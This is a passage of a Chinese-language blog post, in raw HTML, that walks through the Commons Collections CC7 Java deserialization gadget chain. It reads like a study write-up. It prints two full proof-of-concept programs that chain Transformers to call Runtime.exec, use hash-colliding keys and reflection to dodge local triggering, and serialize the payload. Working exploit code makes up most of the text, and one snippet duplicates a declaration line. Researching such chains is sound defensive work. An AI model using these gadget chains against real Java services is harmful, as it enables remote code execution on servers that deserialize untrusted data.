class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样通过注解也很好理解步骤（主要就是value不允许为Null，然后key值不能重复，元素hash不能相同，也是hashtable的特性）</p><ul><li>先判断value值，如果value为空，就抛出序列化异常</li><li>计算key的hash，再根据hash和table长度计算出存储索引index，并判断该key的hash或者该key的值是否在表中存在，如果已存在就抛出序列化异常</li><li>经过判断没问题后 就将key value写入到Entry中</li></ul><p><code>reconstitutionPut</code>方法中调用了<code>key.hashCode()</code>方法和<code>e.key.equals(key)</code>方法，其中<code>key.hashCode()</code>方法在下面<font color="red">POC延伸</font>中会分析，现在还有<code>e.key.equals(key)</code>方法，在for循环中，判断当前元素的<code>key</code>的<code>hash</code>在表中是否存在，并且会对元素的<code>key</code>对表中元素的<code>key</code>进行<code>equals()</code>匹配查看<code>key</code>是否在表中存在。<br>跟进<code>e.key.equals(key)</code>方法，其中<code>e.key</code>表示从流中读取的<code>table</code>表中的<code>key</code>，也就是我们<code>put</code>进的<code>key</code>值。<br>该链通过<code>Hashtable</code>调用<code>Lazymap</code>，那传入的<code>key</code>值肯定就为<code>Lazymap</code>对象。<br><code>e.key.equals(key)</code>调用相当于<code>e.Lazymap.equals(key)</code></p><p><font color="red">满足条件：</font></p><ul><li>value不能为空，设置value值就行。</li><li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在table表中需要有两个元素的hash是相等的，hash相等才能获取到table中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须put进两个hash相等的元素。</li></ul><h3 id="AbstractMapDecorator-equals"><a href="#AbstractMapDecorator-equals" class="headerlink" title="AbstractMapDecorator.equals()"></a>AbstractMapDecorator.equals()</h3><p>跟进<code>Lazymap.equals()</code>方法，但<code>Lazymap</code>类本身没有<code>equals()</code>方法，实际是调用它的父类<code>AbstractMapDecorator</code>下的<code>equals()</code>方法</p><p><img src="/posts/40ba40f0/cc7-2.png" title="AbstractMapDecorator.equals()"></p><p>其中会判断<code>object</code>对象是否为同一个对象，是的话返回<code>true</code>，如果不是同一个对象，就执行<code>map.equals(object)</code>，其中的<code>map</code>为<code>Lazymap</code>传参的<code>map</code>，也就是<code>hashmap</code>对象</p><p>继续跟进<code>hashmap.equals()</code>方法，同样<code>hashmap</code>本身只有在它的<code>Node</code>子类中存在<code>equals()</code>方法，实际调用的也是父类下的<code>equals()</code>方法</p><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h3><p><img src="/posts/40ba40f0/cc7-3.png" title="AbstractMap.equals()"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="comment">//判断是否是同一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断该对象是否属于Map类型</span></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="comment">//判断元素个数是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建迭代器</span></span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                <span class="comment">//依次获取元素</span></span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="comment">//获取Key和value值</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="comment">//value为空的话执行下面判断体</span></span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//value不为空的话执行下面判断体</span></span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><font color="red">满足条件：</font></p><ul><li>不能为同一个对象，如果两个元素相同就直接返回true</li><li>该对象类型必须为Map类型，不是Map类型的话返回false</li><li>对象元素个数必须相同，不同的话返回false</li></ul><p>满足以上条件后，由于本身<code>value</code>不能为空（为空就不会进入到这个调用阶段了），因此会执行<code>if (!value.equals(m.get(key)))</code>判断体中的<code>m.get(key)</code>方法，而<code>m</code>对象由传入的<code>Object</code>对象，也就是上面分析传入对比<code>equals()</code>方法中的对象，即<code>Lazymap</code>对象，实际调用<code>Lazymap.get(key)</code>，达到代码执行的目的。</p><h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>上面几个关键的方法分析完了，从POC构造继续串联起来分析<br>首先触发点不变</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接着就是<code>Lazymap</code>的传值和对<code>hashtable</code>之间的衔接，在上面方法的分析中提到<code>reconstitutionPut()</code>方法中需要满足</p><ul><li><code>value</code>不能为空，设置<code>value</code>值就行。</li><li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在<code>table</code>表中需要有两个元素的<code>hash</code>是相等的，<code>hash</code>相等才能获取到<code>table</code>中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须<code>put</code>进两个<code>hash</code>相等的元素。</li></ul><p><img src="/posts/40ba40f0/cc7-4.png" title="满足条件"></p><p>由上满足条件，我们传入两个相同的元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>但会遇到问题，如果传入两个相同的元素，由于<code>hashtable</code>的<code>put</code>操作</p><p><img src="/posts/40ba40f0/cc7-5.png" title="put()"></p><p>其中针对第一个元素<code>put</code>入的时候，此时<code>Table</code>不存在其他元素，此时<code>index</code>指针获取的<code>table</code>为<code>null</code>，不会进入<code>for</code>循环体，直接进入<code>addEntry()</code>方法中</p><p><img src="/posts/40ba40f0/cc7-6.png" title="addEntry()"></p><p><code>addEntry()</code>方法将元素添加对应元素<code>hash</code>计算出来的<code>index</code>指针的<code>table</code>中，最后计数+1，表示<code>table</code>中新增了一个元素个数</p><p>如果添加两个一模一样的元素，就会导致在第二次<code>put</code>对象时，由于<code>hash</code>相同，计算的<code>index</code>相同，<code>key</code>值相同，进入到<code>put</code>方法的<code>for</code>循环中返回了，自然不会进行<code>addEntry()</code>添加操作，此时<code>table</code>表中元素个数仍为1。</p><p><img src="/posts/40ba40f0/cc7-12.png" title="第二次put"></p><p>在反序列化获取<code>elements</code>元素个数时，此时也为1，只进行一次<code>reconstitutionPut</code>方法调用。而需要调用第二次<code>reconstitutionPut</code>方法，判断里面的<code>hash</code>相同才能运行到<code>e.key.equals(key)</code>方法。</p><p><img src="/posts/40ba40f0/cc7-7.png" title="反序列化过程"></p><p>因此需要我们传入两个元素的hash相同，但是元素key不相同的两组元素</p><p>由上满足条件，我们传入两个元素的hash相同，但是元素key不相同的两组元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/40ba40f0/cc7-8.png" title="hash相同的元素"></p><p>再解决本地触发的问题，由于在第二次<code>put</code>中会进入到循环体中执行<code>e.key.equals(key)</code>方法，会调用到<code>transformerChain.transform()</code>达到执行代码。</p><p>规避这个问题还是用老方法，先传入空的转换器进<code>Lazymap</code>对象中，<code>put</code>完值后再通过反射修改转换器。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//修改触发的转换器</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap2,transformerChain);</span><br></pre></td></tr></table></figure><p>由于<code>put</code>第二次的时候<code>e.key.equals(key)</code>中的<code>e.key</code>为第一次元素的<code>Key</code>，目的是拿第二次<code>put</code>的<code>key</code>查看是否跟表中的<code>key</code>是否相等，而参数中的<code>key</code>(第二次put入的key值)为最后调用的<code>m.get()</code>中的<code>m</code>对象，因此只需要修改第二个传入的<code>lazymap</code>对象的<code>factory</code>即可。</p><p><img src="/posts/40ba40f0/cc7-11.png" title="触发点对象"></p><p>还有个点就是由于在<code>put</code>入第二个<code>entry</code>元素时，调用了<code>e.key.equals(key)</code>方法，最后调用到<code>m.get(key)</code>即<code>Lazymap.get(key)</code>方法</p><p><img src="/posts/40ba40f0/cc7-9.png" title="Lazymap.get(key)"></p><p>由于转换器制空后，本地不会触发代码执行，但会进行<code>map.put(key, value);</code>，将第二个元素的<code>key</code>进行<code>put</code>操作，此时<code>Lazymap2</code>又新增了一个<code>key</code>为<code>yy</code>的元素，因此需要删除</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/40ba40f0/cc7-10.png" title="新增的yy"></p><p>最后将<code>hashtable</code>对象进行序列化，反序列化的时候触发漏洞，得到完整poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">        Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">        ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//修改触发的转换器</span></span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap2,transformerChain);</span><br><span class="line">        Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="CC7-POC延伸"><a href="#CC7-POC延伸" class="headerlink" title="CC7-POC延伸"></a>CC7-POC延伸</h2><p>反序列化（readObject）过程中提到的<code>reconstitutionPut</code>方法</p><p><img src="/posts/40ba40f0/cc7-13.png" title="hashCode()"></p><p>在上面反序列化过程<code>reconstitutionPut</code>方法写入<code>entry</code>中发现一个敏感的<font color="red">key.hashCode()</font>，在cc6的学习中就是利用<code>hashmap.put(key,value)</code>调用<code>hash(key)</code>方法最后调用<code>key.hashcode()</code>进行调用达到代码执行。<br>同样在这里，key值可控，也是通过<code>hashtable</code>对象<code>put</code>入的<code>key</code>值进行<code>hashCode()</code>操作，跟cc6基本没差别，这就不再复分析一遍了。<br>得到一个延伸的poc<br>触发点不变</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>通过<code>lazymap</code>调用触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>再通过<code>TiedMapEntry</code>类最后调用<code>Lazymap.get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>最后使用<code>hashtable</code>的<code>put</code>方法添加元素<code>TiedMapEntry</code>对象作为入口,通过反射修改<code>table</code>表<code>key</code>值去规避本地执行，同样可以通过反射修改链转换器，操作跟cc6分析写Poc的一样，这里就用反射修改<code>key</code>值了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>然后序列化，反序列化触发漏洞，得到完整POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = 